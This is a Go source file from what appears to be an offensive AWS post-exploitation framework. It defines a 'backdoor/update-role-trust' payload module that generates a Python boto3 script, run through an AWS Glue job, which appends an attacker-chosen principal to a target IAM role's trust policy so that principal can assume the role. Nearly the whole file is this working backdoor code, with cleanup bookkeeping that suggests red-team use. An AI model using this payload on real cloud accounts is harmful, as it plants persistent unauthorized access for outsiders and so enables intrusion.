package glue

import (
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
)

type BackdoorUpdateRoleTrustPayload struct{}

func init() {
	payloads.Register(&BackdoorUpdateRoleTrustPayload{})
}

func (p *BackdoorUpdateRoleTrustPayload) GetName() string {
	return "backdoor/update-role-trust"
}

func (p *BackdoorUpdateRoleTrustPayload) GetDescription() string {
	return "Update a role's trust policy to add a trusted principal via Glue job"
}

func (p *BackdoorUpdateRoleTrustPayload) GetTags() []string {
	return []string{
		payloads.TagServiceGlue,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorUpdateRoleTrustPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ROLE",
			Description: "Name of the IAM role to modify",
			Required:    true,
		},
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "Principal to trust (ARN, account ID, or service name e.g. lambda.amazonaws.com)",
			Required:    true,
		},
	}
}

func (p *BackdoorUpdateRoleTrustPayload) Validate(options map[string]string) error {
	if options["TARGET_ROLE"] == "" {
		return fmt.Errorf("TARGET_ROLE is required for backdoor/update-role-trust payload")
	}
	if options["TRUST_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUST_PRINCIPAL is required for backdoor/update-role-trust payload")
	}
	return nil
}

func (p *BackdoorUpdateRoleTrustPayload) GenerateCode(options map[string]string) (string, error) {
	targetRole := options["TARGET_ROLE"]
	trustPrincipal := options["TRUST_PRINCIPAL"]

	code := fmt.Sprintf(`import boto3
import json
import sys

target_role = '%s'
trust_principal = '%s'

for i, arg in enumerate(sys.argv):
    if arg == '--TARGET_ROLE' and i + 1 < len(sys.argv):
        target_role = sys.argv[i + 1]
    if arg == '--TRUST_PRINCIPAL' and i + 1 < len(sys.argv):
        trust_principal = sys.argv[i + 1]

# Auto-detect principal type from format
if trust_principal.endswith('.amazonaws.com'):
    principal_key = 'Service'
elif trust_principal.isdigit() and len(trust_principal) == 12:
    principal_key = 'AWS'
    trust_principal = f'arn:aws:iam::{trust_principal}:root'
else:
    principal_key = 'AWS'

iam = boto3.client('iam')

try:
    role_response = iam.get_role(RoleName=target_role)
    current_policy = role_response['Role']['AssumeRolePolicyDocument']

    print("Current trust policy:")
    print(json.dumps(current_policy, indent=2))

    new_statement = {
        'Effect': 'Allow',
        'Principal': {
            principal_key: trust_principal
        },
        'Action': 'sts:AssumeRole'
    }

    current_policy['Statement'].append(new_statement)

    iam.update_assume_role_policy(
        RoleName=target_role,
        PolicyDocument=json.dumps(current_policy)
    )

    print(f"\nUpdated trust policy for role {target_role}")
    print(f"Added trusted principal: {trust_principal}")
    print("\nNew trust policy:")
    print(json.dumps(current_policy, indent=2))

except Exception as e:
    print(f"Error updating role trust policy: {e}")
    raise
`, targetRole, trustPrincipal)

	return code, nil
}

func (p *BackdoorUpdateRoleTrustPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

func (p *BackdoorUpdateRoleTrustPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	return []modules.CreatedResource{
		{
			Type:          "iam:trust-policy",
			Name:          fmt.Sprintf("%s-trust-modification", options["TARGET_ROLE"]),
			CleanupMethod: "iam:UpdateAssumeRolePolicy",
			Metadata: map[string]string{
				"target_role":     options["TARGET_ROLE"],
				"trust_principal": options["TRUST_PRINCIPAL"],
				"original_policy": "see-glue-logs",
			},
		},
	}
}
